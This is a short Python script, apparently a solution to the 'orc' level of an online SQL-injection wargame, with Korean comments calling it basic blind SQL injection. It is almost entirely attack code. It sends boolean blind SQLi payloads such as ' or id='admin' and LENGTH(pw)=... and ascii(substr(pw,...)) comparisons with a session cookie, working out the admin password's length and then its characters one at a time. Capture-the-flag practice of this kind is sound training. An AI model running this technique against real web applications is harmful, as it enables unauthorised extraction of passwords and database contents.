#-*-coding:utf-8-*-

import requests
import string

length = 0
abc = string.digits + string.ascii_letters

url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
PHPSESSID = 'gjsvu2u7cfp9vre7aniv1sdv69'

pw = "' or id='admin' and if(ascii(substr(pw,"
middle_of_blind_sqli = '))='
end_of_blind_sqli = ',1,0); -- '

true_result = '<h2>Hello admin</h2>'

answer = ''

cookie = {'PHPSESSID':PHPSESSID}

for x in range(1, 20):
    param = "?pw=1' or id='admin' and LENGTH(pw)=" + str(x) + "; -- "
    new_url = url + param
    response = requests.get(new_url, cookies=cookie)

    if response.text.find(true_result) > -1:
        length = x + 1
        print("pw의 길이는 "+str(length-1))
        break

for idx in range(1, length):
    for ascii_char in abc:
        param = "?pw="+pw+str(idx)+middle_of_blind_sqli+str(ord(ascii_char))+end_of_blind_sqli
        new_url = url + param
        response = requests.get(new_url, cookies=cookie)

        if response.text.find(true_result) > -1:
            answer += str(ascii_char)
            print(str(idx) + "번째 문자 : "+str(ascii_char))
            break

response = requests.get(url + '?pw=' + answer, cookies=cookie)

if response.text.find('Clear!') > 0:
    print('Stage Clear')
else:
    print('Not yet')

# Basic Blind SQL Injection
# Blind SQL Injection의 기초
